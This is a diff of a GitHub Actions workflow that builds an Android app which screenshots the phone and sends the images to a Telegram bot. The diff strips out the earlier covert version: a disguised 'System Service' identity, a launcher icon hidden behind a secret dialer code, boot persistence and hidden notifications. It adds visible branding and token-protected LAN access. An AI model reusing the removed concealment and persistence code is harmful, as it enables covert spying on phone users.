@@ -1,4 +1,4 @@
-name: Silent Periodic Screenshot to Telegram
+name: ScreenShareLAN Periodic Screenshot
 
 on:
   push:
@@ -44,8 +44,8 @@ jobs:
                   applicationId "com.lan.screenshare"
                   minSdk 26
                   targetSdk 34
-                  versionCode 12
-                  versionName "3.4-telegram-bot"
+                  versionCode 14
+                  versionName "3.6-fixed"
               }
               compileOptions {
                   sourceCompatibility JavaVersion.VERSION_17
@@ -66,58 +66,29 @@ jobs:
               <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
-              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
               <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-              <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
 
               <application
-                  android:label="System Service"
-                  android:icon="@android:drawable/ic_menu_manage"
+                  android:label="ScreenShareLAN"
+                  android:icon="@android:drawable/ic_menu_camera"
                   android:theme="@android:style/Theme.DeviceDefault.Light.DarkActionBar"
                   android:allowBackup="false">
 
                   <activity
                       android:name=".MainActivity"
                       android:exported="true"
-                      android:launchMode="singleTop"
-                      android:excludeFromRecents="true" />
-
-                  <activity-alias
-                      android:name=".Launcher"
-                      android:targetActivity=".MainActivity"
-                      android:enabled="true"
-                      android:exported="true">
+                      android:launchMode="singleTop">
                       <intent-filter>
                           <action android:name="android.intent.action.MAIN" />
                           <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
-                  </activity-alias>
+                  </activity>
 
                   <service
                       android:name=".StreamService"
                       android:enabled="true"
                       android:exported="false"
                       android:foregroundServiceType="mediaProjection" />
-
-                  <receiver
-                      android:name=".BootReceiver"
-                      android:enabled="true"
-                      android:exported="true">
-                      <intent-filter>
-                          <action android:name="android.intent.action.BOOT_COMPLETED" />
-                          <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-                      </intent-filter>
-                  </receiver>
-
-                  <receiver
-                      android:name=".SecretCodeReceiver"
-                      android:enabled="true"
-                      android:exported="true">
-                      <intent-filter>
-                          <action android:name="android.provider.Telephony.SECRET_CODE" />
-                          <data android:scheme="android_secret_code" android:host="1234" />
-                      </intent-filter>
-                  </receiver>
               </application>
           </manifest>
           EOF
@@ -127,7 +98,6 @@ jobs:
 
           import android.app.*
           import android.content.BroadcastReceiver
-          import android.content.ComponentName
           import android.content.Context
           import android.content.Intent
           import android.content.IntentFilter
@@ -183,8 +153,11 @@ jobs:
                       }
                   }
 
-                  val readyIntent = Intent(this, StreamService::class.java).apply { action = "READY" }
-                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(readyIntent) else startService(readyIntent)
+                  val prefs = getSharedPreferences("telegram_prefs", Context.MODE_PRIVATE)
+                  if (prefs.getString("http_token", "").isNullOrEmpty()) {
+                      val newToken = UUID.randomUUID().toString().substring(0, 12)
+                      prefs.edit().putString("http_token", newToken).apply()
+                  }
 
                   val scroll = ScrollView(this)
                   val layout = LinearLayout(this).apply {
@@ -197,18 +170,15 @@ jobs:
                       textSize = 14f
                       setTextIsSelectable(true)
                   }
-
                   layout.addView(statusTxt)
-                  
-                  val prefs = getSharedPreferences("telegram_prefs", Context.MODE_PRIVATE)
-                  
+
                   val etToken = EditText(this).apply {
                       hint = "Telegram Bot Token"
                       setText(prefs.getString("bot_token", ""))
                       setTextColor(Color.BLACK)
                   }
                   layout.addView(etToken)
-                  
+
                   val etChatId = EditText(this).apply {
                       hint = "Telegram Chat ID"
                       setText(prefs.getString("chat_id", ""))
@@ -219,19 +189,23 @@ jobs:
                   layout.addView(Button(this).apply {
                       text = "حفظ إعدادات تيليجرام"
                       setOnClickListener {
-                          prefs.edit().putString("bot_token", etToken.text.toString().trim()).apply()
-                          prefs.edit().putString("chat_id", etChatId.text.toString().trim()).apply()
+                          prefs.edit()
+                              .putString("bot_token", etToken.text.toString().trim())
+                              .putString("chat_id", etChatId.text.toString().trim())
+                              .apply()
                           Toast.makeText(this@MainActivity, "تم الحفظ!", Toast.LENGTH_SHORT).show()
                           statusTxt.text = buildStatusText()
                       }
                   })
 
                   layout.addView(Button(this).apply {
-                      text = "1) منح إذن الشاشة (مرة واحدة)"
+                      text = "1) منح إذن الشاشة وتشغيل الخدمة"
                       setOnClickListener {
                           try {
                               startActivityForResult(projMgr.createScreenCaptureIntent(), 100)
-                          } catch (e: Exception) { statusTxt.text = "خطأ: ${e.message}" }
+                          } catch (e: Exception) {
+                              statusTxt.text = "خطأ: ${e.message}"
+                          }
                       }
                   })
 
@@ -243,9 +217,13 @@ jobs:
                               val success = StreamService.sendToTelegramStatic(bytes)
                               runOnUiThread {
                                   if (bytes != null) {
-                                      statusTxt.text = if(success) "✅ تم التقاط وإرسال ${bytes.size} بايت لتيليجرام" else "⚠️ تم الالتقاط لكن فشل الإرسال لتيليجرام (تأكد من الإعدادات)"
+                                      statusTxt.text = if (success) {
+                                          "✅ تم التقاط وإرسال ${bytes.size} بايت لتيليجرام"
+                                      } else {
+                                          "⚠️ تم الالتقاط (${bytes.size} بايت) لكن فشل الإرسال لتيليجرام"
+                                      }
                                   } else {
-                                      statusTxt.text = "❌ فشل الالتقاط (تحقق من الإذن)"
+                                      statusTxt.text = "❌ فشل الالتقاط (يرجى منح إذن الشاشة أولاً)"
                                   }
                               }
                           }
@@ -256,15 +234,18 @@ jobs:
                       text = "3) إيقاف/استئناف الالتقاط التلقائي"
                       setOnClickListener {
                           StreamService.userPaused = !StreamService.userPaused
-                          runOnUiThread { statusTxt.text = buildStatusText() }
+                          statusTxt.text = buildStatusText()
                       }
                   })
 
                   layout.addView(Button(this).apply {
-                      text = "4) إخفاء التطبيق نهائياً"
+                      text = "4) إيقاف الخدمة بالكامل"
                       setOnClickListener {
-                          hideLauncher()
-                          statusTxt.text = "✅ مخفي الآن.\nللاستعادة: *#*#1234#*#*"
+                          val stopIntent = Intent(this@MainActivity, StreamService::class.java).apply {
+                              action = "STOP"
+                          }
+                          startService(stopIntent)
+                          statusTxt.text = buildStatusText()
                       }
                   })
 
@@ -285,20 +266,13 @@ jobs:
                           putExtra("code", resultCode)
                           putExtra("data", data)
                       }
-                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
-                      statusTxt.text = buildStatusText()
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                          startForegroundService(intent)
+                      } else {
+                          startService(intent)
+                      }
+                      statusTxt.postDelayed({ statusTxt.text = buildStatusText() }, 500)
                   }
-              }
-
-              private fun hideLauncher() {
-                  try {
-                      val alias = ComponentName(this, "$packageName.Launcher")
-                      packageManager.setComponentEnabledSetting(
-                          alias,
-                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                          PackageManager.DONT_KILL_APP
-                      )
-                  } catch (_: Exception) {}
               }
 
               private fun buildStatusText(): String {
@@ -307,26 +281,26 @@ jobs:
                       StreamService.userPaused -> "موقوف يدوياً ⏸"
                       !StreamService.screenOn -> "ينتظر فتح القفل ⏳"
                       StreamService.isCapturing -> "يعمل 🟢"
-                      StreamService.isReady -> "جاهز 🟡"
                       else -> "متوقف 🔴"
                   }
                   val diskSize = getDiskUsage()
                   val fileCount = getFileCount()
-                  
+
                   val prefs = getSharedPreferences("telegram_prefs", Context.MODE_PRIVATE)
-                  val hasTg = prefs.getString("bot_token", "").isNullOrEmpty().not() && prefs.getString("chat_id", "").isNullOrEmpty().not()
+                  val hasTg = !prefs.getString("bot_token", "").isNullOrEmpty() &&
+                              !prefs.getString("chat_id", "").isNullOrEmpty()
                   val tgStatus = if (hasTg) "مفعل ✅" else "غير مفعل ❌"
+                  val httpToken = prefs.getString("http_token", "") ?: ""
 
                   return "الحالة: $state\n" +
                          "تيليجرام: $tgStatus\n" +
-                         "الفاصل الحالي: ${StreamService.captureInterval/1000} ثانية\n" +
+                         "الفاصل الحالي: ${StreamService.captureInterval / 1000} ثانية\n" +
                          "اللقطات المحفوظة محلياً: $fileCount\n" +
-                         "المساحة المستخدمة: ${diskSize/1024/1024} MB\n\n" +
+                         "المساحة المستخدمة: ${diskSize / 1024 / 1024} MB\n\n" +
                          "أوامر البوت:\n" +
-                         "/start, /stop, /clear\n" +
-                         "/10, /20, /30, /status\n\n" +
-                         "التحكم من المتصفح:\n" +
-                         "http://$localIp:8080\n\n" +
+                         "/start, /stop, /clear, /10, /20, /30, /status\n\n" +
+                         "التحكم من المتصفح (محمي برمز):\n" +
+                         "http://$localIp:8080/?token=$httpToken\n\n" +
                          "عناوين IP:\n" +
                          getAllIps()
               }
@@ -378,7 +352,6 @@ jobs:
 
           class StreamService : Service() {
               companion object {
-                  @Volatile var isReady = false
                   @Volatile var isCapturing = false
                   @Volatile var userPaused = false
                   @Volatile var screenOn = true
@@ -387,7 +360,7 @@ jobs:
 
                   private var instance: StreamService? = null
                   fun captureNow(): ByteArray? = instance?.captureOne()
-                  
+
                   fun sendToTelegramStatic(bytes: ByteArray?): Boolean {
                       if (bytes == null) return false
                       return instance?.sendToTelegram(bytes) ?: false
@@ -401,7 +374,7 @@ jobs:
               private var savedData: Intent? = null
               private val buffer = ArrayDeque<Pair<Long, ByteArray>>()
               private val maxBuffer = 20
-              private var stopRequested = false
+              @Volatile private var stopRequested = false
               private var lockReceiverRegistered = false
               private var pollingThread: Thread? = null
               private var autoThread: Thread? = null
@@ -410,14 +383,14 @@ jobs:
               private val projCallback = object : MediaProjection.Callback() {
                   override fun onStop() {
                       isCapturing = false
-                      updateNotification("جاهز")
+                      updateNotification("متوقف")
                   }
               }
 
               private val lockStateReceiver = object : BroadcastReceiver() {
                   override fun onReceive(context: Context?, intent: Intent?) {
                       when (intent?.action) {
-                          Intent.ACTION_USER_PRESENT -> screenOn = true
+                          Intent.ACTION_USER_PRESENT,
                           Intent.ACTION_SCREEN_ON -> screenOn = true
                           Intent.ACTION_SCREEN_OFF -> screenOn = false
                       }
@@ -427,48 +400,53 @@ jobs:
               override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
                   instance = this
                   when (intent?.action) {
-                      "READY" -> startReadyMode()
                       "START" -> {
                           val code = intent.getIntExtra("code", Activity.RESULT_CANCELED)
-                          val data = if (Build.VERSION.SDK_INT >= 33)
+                          val data = if (Build.VERSION.SDK_INT >= 33) {
                               intent.getParcelableExtra("data", Intent::class.java)
-                          else @Suppress("DEPRECATION") intent.getParcelableExtra("data")
-                          if (data != null) {
+                          } else {
+                              @Suppress("DEPRECATION") intent.getParcelableExtra("data")
+                          }
+                          if (code == Activity.RESULT_OK && data != null) {
                               savedResultCode = code
                               savedData = data
                               startProjection(code, data)
+                          } else {
+                              stopSelf()
                           }
                       }
-                      "STOP" -> stopAll()
-                      else -> startReadyMode()
+                      "STOP" -> {
+                          stopAll()
+                          stopSelf()
+                      }
+                      else -> stopSelf()
                   }
-                  return START_STICKY
-              }
-
-              private fun startReadyMode() {
-                  createNotification("جاهز")
-                  isReady = true
-                  startHttpServer()
-                  acquireWakeLock()
-                  registerLockReceiver()
-                  startBotPolling()
+                  return START_NOT_STICKY
               }
 
               private fun startProjection(code: Int, data: Intent) {
                   try {
-                      isCapturing = false
-                      updateNotification("يعمل")
+                      stopRequested = false
+                      createNotification("جاري تهيئة الالتقاط...")
+
                       val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+                      projection?.unregisterCallback(projCallback)
+                      projection?.stop()
                       projection = mgr.getMediaProjection(code, data)
                       projection?.registerCallback(projCallback, Handler(Looper.getMainLooper()))
+
                       isCapturing = true
-                      isReady = true
-                      startHttpServer()
+                      acquireWakeLock()
                       registerLockReceiver()
+                      startHttpServer()
                       startBotPolling()
                       startAutoLoop()
-                  } catch (_: Exception) {
-                      updateNotification("جاهز")
+
+                      updateNotification("يعمل")
+                  } catch (e: Exception) {
+                      e.printStackTrace()
+                      isCapturing = false
+                      stopSelf()
                   }
               }
 
@@ -499,8 +477,8 @@ jobs:
               private fun isPhoneUsable(): Boolean {
                   if (!screenOn) return false
                   return try {
-                      val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as? android.app.KeyguardManager
-                      keyguardManager?.isKeyguardLocked == false
+                      val km = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
+                      km?.isKeyguardLocked == false
                   } catch (_: Throwable) { true }
               }
 
@@ -508,8 +486,7 @@ jobs:
                   if (autoThread?.isAlive == true) return
                   autoThread = thread(name = "AutoLoop") {
                       while (isCapturing && !stopRequested) {
-                          val shouldCapture = !userPaused && isPhoneUsable()
-                          if (shouldCapture) {
+                          if (!userPaused && isPhoneUsable()) {
                               try {
                                   val bytes = captureOne()
                                   if (bytes != null) {
@@ -530,38 +507,39 @@ jobs:
 
               private fun startBotPolling() {
                   if (pollingThread?.isAlive == true) return
-                  stopRequested = false
                   pollingThread = thread(name = "BotPoll") {
                       while (!stopRequested) {
+                          var conn: HttpURLConnection? = null
                           try {
                               val prefs = getSharedPreferences("telegram_prefs", Context.MODE_PRIVATE)
                               val token = prefs.getString("bot_token", "") ?: ""
                               val chatId = prefs.getString("chat_id", "") ?: ""
-                              
+
                               if (token.isEmpty() || chatId.isEmpty()) {
                                   Thread.sleep(5000)
                                   continue
                               }
 
                               val url = URL("https://api.telegram.org/bot$token/getUpdates?offset=$lastUpdateId&timeout=30")
-                              val conn = url.openConnection() as HttpURLConnection
+                              conn = url.openConnection() as HttpURLConnection
                               conn.requestMethod = "GET"
                               conn.connectTimeout = 35000
                               conn.readTimeout = 35000
-                              
+
                               if (conn.responseCode == 200) {
-                                  val response = conn.inputStream.bufferedReader().readText()
+                                  val response = conn.inputStream.bufferedReader().use { it.readText() }
                                   val root = JSONObject(response)
-                                  if (root.getBoolean("ok")) {
+                                  if (root.optBoolean("ok")) {
                                       val results = root.getJSONArray("result")
                                       for (i in 0 until results.length()) {
                                           val update = results.getJSONObject(i)
                                           lastUpdateId = update.getLong("update_id") + 1
-                                          
+
                                           if (update.has("message")) {
                                               val message = update.getJSONObject("message")
-                                              val msgChatId = message.getJSONObject("chat").getString("id")
-                                              
+                                              val chatObj = message.optJSONObject("chat")
+                                              val msgChatId = chatObj?.optLong("id")?.toString() ?: ""
+
                                               if (msgChatId == chatId && message.has("text")) {
                                                   val text = message.getString("text").trim().lowercase()
                                                   handleBotCommand(text)
@@ -570,9 +548,10 @@ jobs:
                                       }
                                   }
                               }
-                              conn.disconnect()
                           } catch (_: Exception) {
                               try { Thread.sleep(5000) } catch (_: Exception) {}
+                          } finally {
+                              conn?.disconnect()
                           }
                       }
                   }
@@ -582,19 +561,12 @@ jobs:
                   when (command) {
                       "/start" -> {
                           userPaused = false
-                          if (!isCapturing) {
-                              if (savedData != null) {
-                                  startProjection(savedResultCode, savedData!!)
-                                  sendTelegramMsg("▶️ تم تفعيل الالتقاط التلقائي (تم استئناف الجلسة).")
-                              } else {
-                                  sendTelegramMsg("⚠️ يرجى فتح التطبيق ومنح إذن الشاشة أولاً.")
-                              }
-                          } else {
-                              sendTelegramMsg("▶️ تم تفعيل الالتقاط التلقائي.")
-                          }
+                          updateNotification("يعمل")
+                          sendTelegramMsg("▶️ تم تفعيل الالتقاط التلقائي.")
                       }
                       "/stop" -> {
                           userPaused = true
+                          updateNotification("موقوف مؤقتاً")
                           sendTelegramMsg("⏸ تم إيقاف الالتقاط التلقائي.")
                       }
                       "/clear" -> {
@@ -602,21 +574,21 @@ jobs:
                           sendTelegramMsg("🗑️ تم مسح جميع الصور المحفوظة في الهاتف.")
                       }
                       "/10" -> {
-                          captureInterval = 10000L
+                          captureInterval = 10_000L
                           sendTelegramMsg("⏱️ تم تغيير الفاصل الزمني إلى 10 ثوانٍ.")
                       }
                       "/20" -> {
-                          captureInterval = 20000L
+                          captureInterval = 20_000L
                           sendTelegramMsg("⏱️ تم تغيير الفاصل الزمني إلى 20 ثانية.")
                       }
                       "/30" -> {
-                          captureInterval = 30000L
+                          captureInterval = 30_000L
                           sendTelegramMsg("⏱️ تم تغيير الفاصل الزمني إلى 30 ثانية.")
                       }
                       "/status" -> {
                           val count = try { File(filesDir, "shots").walkTopDown().count { it.isFile } } catch (_: Exception) { 0 }
                           val state = if (userPaused) "متوقف مؤقتاً ⏸" else "يعمل 🟢"
-                          sendTelegramMsg("📊 الحالة: $state\n⏱️ الفاصل: ${captureInterval/1000} ثانية\n🖼️ الصور المحفوظة: $count")
+                          sendTelegramMsg("📊 الحالة: $state\n⏱️ الفاصل: ${captureInterval / 1000} ثانية\n🖼️ الصور المحفوظة: $count")
                       }
                       else -> {
                           sendTelegramMsg("❓ أمر غير معروف.\nالأوامر المتاحة:\n/start\n/stop\n/clear\n/10\n/20\n/30\n/status")
@@ -629,7 +601,10 @@ jobs:
                       val root = File(filesDir, "shots")
                       root.deleteRecursively()
                       root.mkdirs()
-                      synchronized(buffer) { buffer.clear() }
+                      synchronized(buffer) {
+                          buffer.clear()
+                          bufferSize = 0
+                      }
                   } catch (_: Exception) {}
               }
 
@@ -638,15 +613,20 @@ jobs:
                   val token = prefs.getString("bot_token", "") ?: ""
                   val chatId = prefs.getString("chat_id", "") ?: ""
                   if (token.isEmpty() || chatId.isEmpty()) return
+
+                  var conn: HttpURLConnection? = null
                   try {
                       val encodedMsg = URLEncoder.encode(msg, "UTF-8")
                       val url = URL("https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=$encodedMsg")
-                      val conn = url.openConnection() as HttpURLConnection
+                      conn = url.openConnection() as HttpURLConnection
                       conn.requestMethod = "GET"
                       conn.connectTimeout = 10000
                       conn.readTimeout = 10000
                       conn.inputStream.close()
-                  } catch (_: Exception) {}
+                  } catch (_: Exception) {
+                  } finally {
+                      conn?.disconnect()
+                  }
               }
 
               fun sendToTelegram(webpBytes: ByteArray): Boolean {
@@ -655,37 +635,36 @@ jobs:
                   val chatId = prefs.getString("chat_id", "") ?: ""
                   if (token.isEmpty() || chatId.isEmpty()) return false
 
+                  var conn: HttpURLConnection? = null
                   return try {
                       val boundary = "*****" + System.currentTimeMillis() + "*****"
                       val url = URL("https://api.telegram.org/bot$token/sendPhoto")
-                      val conn = url.openConnection() as HttpURLConnection
+                      conn = url.openConnection() as HttpURLConnection
                       conn.requestMethod = "POST"
                       conn.doOutput = true
                       conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")
                       conn.connectTimeout = 15000
                       conn.readTimeout = 15000
 
-                      val outputStream = conn.outputStream
-                      val writer = DataOutputStream(outputStream)
+                      DataOutputStream(conn.outputStream).use { writer ->
+                          writer.writeBytes("--$boundary\r\n")
+                          writer.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
+                          writer.writeBytes("$chatId\r\n")
 
-                      writer.writeBytes("--$boundary\r\n")
-                      writer.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
-                      writer.writeBytes("$chatId\r\n")
+                          writer.writeBytes("--$boundary\r\n")
+                          writer.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"shot.webp\"\r\n")
+                          writer.writeBytes("Content-Type: image/webp\r\n\r\n")
+                          writer.write(webpBytes)
+                          writer.writeBytes("\r\n")
+                          writer.writeBytes("--$boundary--\r\n")
+                          writer.flush()
+                      }
 
-                      writer.writeBytes("--$boundary\r\n")
-                      writer.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"shot.webp\"\r\n")
-                      writer.writeBytes("Content-Type: image/webp\r\n\r\n")
-                      writer.write(webpBytes)
-                      writer.writeBytes("\r\n")
-                      writer.writeBytes("--$boundary--\r\n")
-                      writer.flush()
-                      writer.close()
-
-                      val responseCode = conn.responseCode
-                      conn.disconnect()
-                      responseCode == 200
+                      conn.responseCode == 200
                   } catch (_: Exception) {
                       false
+                  } finally {
+                      conn?.disconnect()
                   }
               }
 
@@ -694,11 +673,6 @@ jobs:
                   var vd: VirtualDisplay? = null
                   var ir: ImageReader? = null
                   try {
-                      // إظهار الإشعار لجزء من الثانية
-                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                          startForeground(1, buildNotification("جاري الالتقاط..."), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
-                      }
-
                       val metrics = resources.displayMetrics
                       val w = 480
                       var h = (metrics.heightPixels * (480f / metrics.widthPixels)).toInt()
@@ -706,7 +680,7 @@ jobs:
 
                       ir = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
                       vd = proj.createVirtualDisplay(
-                          "S", w, h, metrics.densityDpi,
+                          "ScreenCapture", w, h, metrics.densityDpi,
                           DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                           ir.surface, null, null
                       ) ?: return null
@@ -734,17 +708,15 @@ jobs:
 
                           val finalBmp = if (bmpWidth != w) Bitmap.createBitmap(bmp, 0, 0, w, h) else bmp
                           val out = ByteArrayOutputStream()
-                          val fmt = if (Build.VERSION.SDK_INT >= 30) Bitmap.CompressFormat.WEBP_LOSSY
-                                    else @Suppress("DEPRECATION") Bitmap.CompressFormat.WEBP
+                          val fmt = if (Build.VERSION.SDK_INT >= 30) {
+                              Bitmap.CompressFormat.WEBP_LOSSY
+                          } else {
+                              @Suppress("DEPRECATION") Bitmap.CompressFormat.WEBP
+                          }
                           finalBmp.compress(fmt, 55, out)
                           if (finalBmp !== bmp) finalBmp.recycle()
                           bmp.recycle()
-                          
-                          // إخفاء الإشعار بعد الالتقاط
-                          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                              stopForeground(STOP_FOREGROUND_REMOVE)
-                          }
-                          
+
                           return out.toByteArray()
                       } finally {
                           img.close()
@@ -804,8 +776,12 @@ jobs:
                   try { projection?.unregisterCallback(projCallback) } catch (_: Throwable) {}
                   try { projection?.stop() } catch (_: Throwable) {}
                   projection = null
-                  synchronized(buffer) { buffer.clear(); bufferSize = 0 }
-                  updateNotification("جاهز")
+                  synchronized(buffer) {
+                      buffer.clear()
+                      bufferSize = 0
+                  }
+                  try { serverSocket?.close() } catch (_: Throwable) {}
+                  serverSocket = null
               }
 
               private fun startHttpServer() {
@@ -815,7 +791,7 @@ jobs:
                           serverSocket = ServerSocket()
                           serverSocket?.reuseAddress = true
                           serverSocket?.bind(InetSocketAddress("0.0.0.0", 8080))
-                          while (isReady) {
+                          while (!stopRequested && isCapturing) {
                               val client = serverSocket?.accept() ?: break
                               thread { handleClient(client) }
                           }
@@ -828,15 +804,36 @@ jobs:
                       client.soTimeout = 8000
                       val reader = BufferedReader(InputStreamReader(client.getInputStream()))
                       val requestLine = reader.readLine() ?: ""
+                      var authHeader = ""
                       while (true) {
                           val line = reader.readLine()
                           if (line.isNullOrEmpty()) break
+                          if (line.startsWith("Authorization:", ignoreCase = true)) {
+                              authHeader = line.substringAfter(":").trim()
+                          }
                       }
-                      val out = client.getOutputStream()
-                      val path = requestLine.split(" ").getOrNull(1) ?: "/"
 
-                      when {
-                          path.startsWith("/now") -> {
+                      val out = client.getOutputStream()
+                      val fullPath = requestLine.split(" ").getOrNull(1) ?: "/"
+                      val path = fullPath.substringBefore("?")
+                      val query = fullPath.substringAfter("?", "")
+
+                      val prefs = getSharedPreferences("telegram_prefs", Context.MODE_PRIVATE)
+                      val expectedToken = prefs.getString("http_token", "") ?: ""
+                      val queryToken = query.split("&")
+                          .firstOrNull { it.startsWith("token=") }
+                          ?.substringAfter("token=") ?: ""
+
+                      val isAuthorized = expectedToken.isNotEmpty() &&
+                          (queryToken == expectedToken || authHeader == "Bearer $expectedToken")
+
+                      if (!isAuthorized) {
+                          sendUnauthorized(out)
+                          return
+                      }
+
+                      when (path) {
+                          "/now" -> {
                               val bytes = captureOne()
                               if (bytes == null) { sendText(out, "NO_PERMISSION"); return }
                               saveScreenshotToDisk(bytes)
@@ -848,7 +845,7 @@ jobs:
                               }
                               sendImage(out, bytes)
                           }
-                          path.startsWith("/latest") -> {
+                          "/latest" -> {
                               var bytes = synchronized(buffer) { buffer.lastOrNull()?.second }
                               if (bytes == null) {
                                   val root = File(filesDir, "shots")
@@ -861,17 +858,20 @@ jobs:
                               if (bytes == null) { sendText(out, "EMPTY"); return }
                               sendImage(out, bytes)
                           }
-                          path.startsWith("/pause") -> {
+                          "/pause" -> {
                               userPaused = true
+                              updateNotification("موقوف مؤقتاً")
                               sendText(out, "OK_PAUSED")
                           }
-                          path.startsWith("/resume") -> {
+                          "/resume" -> {
                               userPaused = false
-                              if (!isCapturing && savedData != null) startProjection(savedResultCode, savedData!!)
+                              updateNotification("يعمل")
                               sendText(out, "OK_RESUMED")
                           }
-                          path.startsWith("/interval") -> {
-                              val ms = path.substringAfter("ms=", "").substringBefore("&").toLongOrNull()
+                          "/interval" -> {
+                              val ms = query.split("&")
+                                  .firstOrNull { it.startsWith("ms=") }
+                                  ?.substringAfter("ms=")?.toLongOrNull()
                               if (ms != null && ms in 5000..600000) {
                                   captureInterval = ms
                                   sendText(out, "OK_$ms")
@@ -884,11 +884,11 @@ jobs:
                                   !isCapturing -> "OFFLINE"
                                   userPaused -> "PAUSED"
                                   !isPhoneUsable() -> "WAITING"
-                                  else -> "LIVE (${captureInterval/1000}s)"
+                                  else -> "LIVE (${captureInterval / 1000}s)"
                               }
                               val html = "<html><body style='margin:0;background:#111;color:#ccc;text-align:center;font-family:sans-serif'>" +
                                       "<div style='padding:10px'>$status</div>" +
-                                      "<img src='/latest' style='max-width:100%;max-height:90vh'>" +
+                                      "<img src='/latest?token=$expectedToken' style='max-width:100%;max-height:90vh'>" +
                                       "</body></html>"
                               sendHtml(out, html)
                           }
@@ -897,6 +897,13 @@ jobs:
                   } finally {
                       try { client.close() } catch (_: Throwable) {}
                   }
+              }
+
+              private fun sendUnauthorized(out: OutputStream) {
+                  val b = "401 Unauthorized".toByteArray()
+                  out.write("HTTP/1.1 401 Unauthorized\r\nContent-Type: text/plain; charset=utf-8\r\nContent-Length: ${b.size}\r\nConnection: close\r\n\r\n".toByteArray())
+                  out.write(b)
+                  out.flush()
               }
 
               private fun sendImage(out: OutputStream, bytes: ByteArray) {
@@ -920,14 +927,17 @@ jobs:
               }
 
               private fun buildNotification(text: String): Notification {
-                  val chanId = "sys_min"
+                  val chanId = "screen_share_channel"
                   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                      val chan = NotificationChannel(chanId, "Android System", NotificationManager.IMPORTANCE_MIN).apply {
+                      val chan = NotificationChannel(
+                          chanId,
+                          "خدمة التقاط الشاشة",
+                          NotificationManager.IMPORTANCE_LOW
+                      ).apply {
                           setShowBadge(false)
                           enableLights(false)
                           enableVibration(false)
                           setSound(null, null)
-                          lockscreenVisibility = Notification.VISIBILITY_SECRET
                       }
                       getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
                   }
@@ -939,14 +949,11 @@ jobs:
                   )
 
                   return Notification.Builder(this, chanId)
-                      .setContentTitle("Android System")
+                      .setContentTitle("ScreenShareLAN")
                       .setContentText(text)
-                      .setSmallIcon(android.R.drawable.stat_sys_download_done)
+                      .setSmallIcon(android.R.drawable.ic_menu_camera)
                       .setContentIntent(pending)
-                      .setOngoing(false) // تم تعديلها إلى false لتسمح بالإخفاء
-                      .setPriority(Notification.PRIORITY_MIN)
-                      .setCategory(Notification.CATEGORY_SERVICE)
-                      .setVisibility(Notification.VISIBILITY_SECRET)
+                      .setOngoing(true)
                       .build()
               }
 
@@ -960,61 +967,31 @@ jobs:
               }
 
               private fun updateNotification(text: String) {
-                  try { createNotification(text) } catch (_: Throwable) {}
+                  try {
+                      val notif = buildNotification(text)
+                      val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+                      manager.notify(1, notif)
+                  } catch (_: Throwable) {}
               }
 
               private fun acquireWakeLock() {
                   if (wakeLock == null) {
                       val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-                      wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "S::L")
+                      wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ScreenShareLAN::WakeLock")
                       wakeLock?.acquire(10L * 60 * 60 * 1000)
                   }
               }
 
               override fun onDestroy() {
-                  isReady = false
-                  stopRequested = true
+                  stopAll()
                   unregisterLockReceiver()
                   try { pollingThread?.interrupt() } catch (_: Throwable) {}
                   try { autoThread?.interrupt() } catch (_: Throwable) {}
-                  try { projection?.unregisterCallback(projCallback) } catch (_: Throwable) {}
-                  try { projection?.stop() } catch (_: Throwable) {}
-                  try { serverSocket?.close() } catch (_: Throwable) {}
                   try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Throwable) {}
                   super.onDestroy()
               }
 
               override fun onBind(intent: Intent?): IBinder? = null
-          }
-
-          class BootReceiver : BroadcastReceiver() {
-              override fun onReceive(context: Context, intent: Intent?) {
-                  if (intent?.action == Intent.ACTION_BOOT_COMPLETED ||
-                      intent?.action?.contains("QUICKBOOT") == true) {
-                      val i = Intent(context, StreamService::class.java).apply { action = "READY" }
-                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(i)
-                      else context.startService(i)
-                  }
-              }
-          }
-
-          class SecretCodeReceiver : BroadcastReceiver() {
-              override fun onReceive(context: Context, intent: Intent?) {
-                  if (intent?.action == "android.provider.Telephony.SECRET_CODE") {
-                      try {
-                          val alias = ComponentName(context, "${context.packageName}.Launcher")
-                          context.packageManager.setComponentEnabledSetting(
-                              alias,
-                              PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                              PackageManager.DONT_KILL_APP
-                          )
-                      } catch (_: Exception) {}
-                      try {
